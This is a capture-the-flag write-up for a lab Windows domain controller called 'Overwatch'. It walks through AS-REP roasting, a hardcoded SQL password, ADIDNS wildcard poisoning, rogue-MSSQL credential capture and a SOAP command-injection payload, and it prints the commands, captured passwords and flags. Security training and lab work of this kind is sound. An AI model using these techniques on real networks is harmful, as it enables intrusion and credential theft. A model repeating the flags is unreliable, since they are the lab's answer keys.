# Overwatch — Report

## Summary

Windows Server 2022 Domain Controller. Full compromise from unauthenticated to SYSTEM via: credential extraction from a .NET binary, ADIDNS poisoning, MSSQL linked server abuse with a rogue TDS server, and WCF SOAP command injection.

**User flag:** `4671bae0d087df5bc31f8a338f47dd65`
**Root flag:** `75d5af9a280f8e180775b561cca30272`

## Attack Chain

### Step 1: Guest → software$ share → overwatch.exe

**How it was found:** Guest account had AS-REP roasting enabled (no preauth), giving us a TGT with empty password. Authenticated SMB as guest revealed a hidden `software$` share containing a `Monitoring/` directory with a .NET binary `overwatch.exe`.

**What was done:** Downloaded the binary. Used `monodis` to decompile the IL. Found a hardcoded MSSQL connection string in the `MonitoringService` constructor:

```
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
```

Also identified three attack surfaces in the binary:
- `KillProcess(string)` — runs `Stop-Process -Name <input> -Force` via PowerShell (command injection)
- `CheckEdgeHistory()` — reads Edge browser URLs and inserts into MSSQL with string concatenation (SQLi)
- `LogEvent(type, detail)` — same SQL concatenation pattern
- WCF service bound to `http://overwatch.htb:8000/MonitorService` (port 8000 was filtered externally)

### Step 2: sqlsvc → DNS write access

**How it was found:** Used `bloodyAD` to enumerate writable AD objects for sqlsvc. Found:
- `CREATE_CHILD dnsNode` on both `overwatch.htb` and `_msdcs.overwatch.htb` DNS zones
- `msDS-AllowedToActOnBehalfOfOtherIdentity` WRITE on sqlsvc's own object
- `MachineAccountQuota = 10`

**What was done:** Added a wildcard DNS record `*` → `10.10.14.80` via raw LDAP (bloodyAD couldn't handle the `*` character). This made every unresolved `*.overwatch.htb` hostname point to our IP.

**What was tried and failed first:**
- NTLM relay via PrinterBug (SMB signing + LDAP channel binding blocked all relay paths on Server 2022)
- Specific DNS records (portal, monitor, sql03, etc.) — zero organic callbacks from DC in 15+ minutes
- RBCD on sqlsvc — worked but sqlsvc had no SPN, so S4U2Proxy was rejected by KDC
- Kerberos relay via krbrelayx — decrypted the ticket but couldn't extract TGT without unconstrained delegation

**Key lesson:** Spent hours on relay attacks that were HARD BLOCKED by Server 2022 protections. The "Stuck for 15+ minutes" decision tree finally triggered the pivot to MSSQL enumeration.

### Step 3: FAKEPC$ machine account → MSSQL access

**How it was found:** After exhausting relay approaches, went back to basic enumeration. Tried authenticating to MSSQL (port 6520) with every account we had. sqlsvc SQL auth was rejected (localhost restriction). sqlsvc Windows auth was rejected. Then tried `FAKEPC$` — our machine account created via MAQ — and it **worked**. MSSQL had `BUILTIN\Users` as a server principal, which any domain machine account inherits.

**What was done:** Connected as FAKEPC$ to MSSQL. Enumerated:
- NOT sysadmin, CONNECT SQL + VIEW ANY DATABASE only
- `overwatch` database exists, owned by `OVERWATCH\sqlsvc`, inaccessible to us
- Two linked servers: `S200401\SQLEXPRESS` (self) and **`SQL07`** (non-existent remote server)
- SQL07 had `rpc,rpc out,data access` permissions

**The insight:** SQL07 didn't exist as a real server. But `sql07.overwatch.htb` resolved to our IP via the wildcard DNS. When we triggered `EXEC ('SELECT 1') AT SQL07`, the DC's MSSQL connected to us on TCP 1433.

### Step 4: Rogue MSSQL (mitmsqlproxy) → sqlmgmt credentials

**How it was found:** First attempts at a rogue MSSQL server failed — the DC disconnected during the LOGIN phase because MSSQL wraps TLS inside TDS packet headers (not raw TLS). Python's `ssl.wrap_socket` couldn't handle this. A custom pre-login handler got the DC to connect but TLS negotiation always failed.

**What was done:** Found `mitmsqlproxy` (github.com/defragmentator/mitmsqlproxy) — a Twisted-based tool that correctly implements TLS-inside-TDS using OpenSSL BIO operations. Ran it in null/emulation mode on port 1433:

```
sudo python3 mitmsqlproxy.py null -lport 1433
```

Triggered the linked server query from FAKEPC$'s MSSQL session. mitmsqlproxy captured cleartext SQL auth credentials:

```
UserName: sqlmgmt
Password: bIhBbzMMnB82yx
```

Verified via Kerberos TGT that the SQL password was reused as sqlmgmt's AD password.

### Step 5: evil-winrm Kerberos → user flag

**How it was found:** sqlmgmt was identified early via LDAP as a member of `Remote Management Users`. WinRM on port 5985 was open.

**What failed:** pywinrm with NTLM transport returned "Access is denied" — the DC's WinRM only accepted Negotiate/Kerberos (no NTLM). pywinrm with Kerberos transport also failed due to GSSAPI hostname canonicalization issues. curl with `--negotiate` failed until `rdns = false` and `dns_canonicalize_hostname = false` were added to `/etc/krb5.conf`.

**What worked:** Installing `evil-winrm` via Ruby gem. It handled Kerberos message-level encryption correctly where pywinrm did not:

```
kinit sqlmgmt@OVERWATCH.HTB
evil-winrm -i S200401.overwatch.htb -r OVERWATCH.HTB
```

Read `C:\Users\sqlmgmt\Desktop\user.txt` → `4671bae0d087df5bc31f8a338f47dd65`

### Step 6: WCF KillProcess command injection → root flag

**How it was found:** The `overwatch.exe` binary analysis (Step 1) had already identified that `KillProcess(string processName)` concatenates user input into `Stop-Process -Name <input> -Force` PowerShell. Port 8000 was filtered externally but `netstat` from the shell confirmed it was listening on `0.0.0.0:8000` (PID 4 = SYSTEM).

**What was done:** Crafted a SOAP request to the WCF service from the sqlmgmt shell. The key challenge was escaping XML/PowerShell through evil-winrm's stdin pipe — solved by base64-encoding the entire PowerShell script and using `-EncodedCommand`. The heredoc `@'...'@` syntax in PowerShell preserved the XML without escaping issues.

The injection payload in `<processName>`:
```
test; type C:\Users\Administrator\Desktop\root.txt > C:\Users\sqlmgmt\Documents\f.txt
```

The WCF service ran the PowerShell `Stop-Process -Name test; type ... -Force`, which:
1. Failed to stop "test" (doesn't exist, ignored)
2. Executed `type root.txt > f.txt` as SYSTEM
3. The `-Force` at the end was consumed by the redirect

Read `f.txt` → `75d5af9a280f8e180775b561cca30272`

## Credentials

| Account | Password | Source | Access |
|---------|----------|--------|--------|
| guest | (empty) | AS-REP roast, no preauth | SMB share listing |
| sqlsvc | TI0LKcfHzZw1Vv | Hardcoded in overwatch.exe | SMB, DNS write, MSSQL (localhost SQL auth) |
| FAKEPC$ | FakeP@ss123! | Created via MAQ | MSSQL (BUILTIN\Users) |
| sqlmgmt | bIhBbzMMnB82yx | Captured via rogue MSSQL | WinRM (Kerberos), MSSQL |

## Dead Ends & Time Sinks

### NTLM Relay (4+ hours wasted)
Tried every relay combination: SMB→LDAP, SMB→LDAPS, SMB→MSSQL, SMB→WinRM, with and without `--remove-mic`. Server 2022 enforces LDAP signing and LDAPS channel binding. SMB signing is required. All relay paths are HARD BLOCKED. The correct classification: this is a **hard block** (structural, not fixable with better syntax). Should have pivoted after the first two failures instead of trying 7 variations.

### DNS Callback Waiting (1+ hours wasted)
Added specific DNS records and a wildcard, waited for the DC to make outbound connections. Zero callbacks in 15+ minutes. There was no simulation bot browsing internal hostnames. The DNS write was meant to be chained with the MSSQL linked server, not with browser-based attacks.

### Kerberos Relay / krbrelayx (1 hour)
Set up FAKEPC$ SPNs, triggered Kerberos auth via PrinterBug, decrypted the service ticket. But krbrelayx requires unconstrained delegation to extract the TGT, which we couldn't set. The Kerberos relay approach was a **soft block** that I treated as a path instead of recognizing the prerequisite was unachievable.

### Named Pipe 932cddcbdabde3f5 (30 min)
Pipe opened for any user but didn't respond to SOAP, .NET framing, or raw text. Likely a VMware guest auth pipe, not the WCF service. Correctly eliminated via decision tree testing.

### pywinrm Kerberos (1 hour)
pywinrm with `transport='kerberos'` returned "Access is denied" even though Kerberos auth succeeded at the HTTP level. The issue was pywinrm's vendored requests_kerberos not handling WinRM message-level encryption. evil-winrm (Ruby) handled it correctly. This was a **soft block** (wrong tool, not wrong approach).

## Lessons

1. **MSSQL BUILTIN\Users login** — machine accounts inherit BUILTIN\Users membership. Always try machine account auth on MSSQL.

2. **Linked server + DNS = credential capture** — a linked server pointing to a non-existent hostname + DNS write = rogue server. The TDS-over-TLS requirement makes this hard without the right tool (mitmsqlproxy).

3. **Server 2022 blocks all NTLM relay to LDAP** — signing + channel binding. Don't waste time on variations. Classify as hard block immediately.

4. **WinRM Kerberos tooling matters** — pywinrm's Kerberos support is broken for WinRM message encryption. evil-winrm works. Also need `rdns = false` in krb5.conf.

5. **Enumerate MSSQL with every account** — we had MSSQL access for hours via FAKEPC$ but didn't try it because we assumed only sqlsvc could authenticate. The breakthrough came from testing an untried account.

6. **"Am I trying to EXPLOIT when I should ENUMERATE?"** — this question from the decision tree directly led to the MSSQL breakthrough after hours of failed relay attempts.
